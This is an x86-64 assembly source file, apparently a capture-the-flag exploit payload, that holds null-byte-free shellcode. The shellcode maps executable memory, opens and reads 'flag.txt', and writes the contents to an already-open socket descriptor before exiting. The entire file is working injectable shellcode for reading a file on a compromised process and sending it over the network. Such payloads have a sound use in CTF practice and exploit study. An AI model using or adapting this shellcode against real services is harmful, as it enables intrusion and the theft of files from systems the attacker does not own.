;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; file:    exploit.asm
; date:    2017-01-16
; author:  koromodako
; purpose:
;       Main payload which reads flag.txt content and writes it to socket
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[SECTION .text]
global _start

_start:
        jmp short .data

    .start:
        ; prepare data
        pop rbx
        xor rax, rax
        mov [rbx+8], al
        ; buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
        xor rdi, rdi
        xor rsi, rsi
        mov sil, 2
        shl rsi, 11
        xor rdx, rdx
        mov dl, 7
        xor r10, r10
        mov r10B, 34
        xor r8, r8
        xor r9, r9
        mov al, 9
        syscall
        mov r12, rax
        ; fd = open('flag.txt', O_RDONLY, 0)
        mov rdi, rbx
        xor rsi, rsi
        xor rdx, rdx
        xor rax, rax
        mov al, 2
        syscall
        ; sz = read(fd, buf, 4096)
        mov rdi, rax
        mov rsi, r12
        xor rdx, rdx
        mov dl, 2
        shl rdx, 11
        xor rax, rax
        syscall
        ; write(sd, buf, sz)
        xor rdi, rdi
        mov dil, 4              ; change socket descriptor (4) dynamically
        mov rsi, r12
        xor rdx, rax
        xor rax, rax
        mov al, 1
        syscall
        ; exit(1)
        xor rdi, rdi
        mov dil, 1
        xor rax, rax
        mov al, 60
        syscall 

    .data:
        call .start
        db 'flag.txtN'
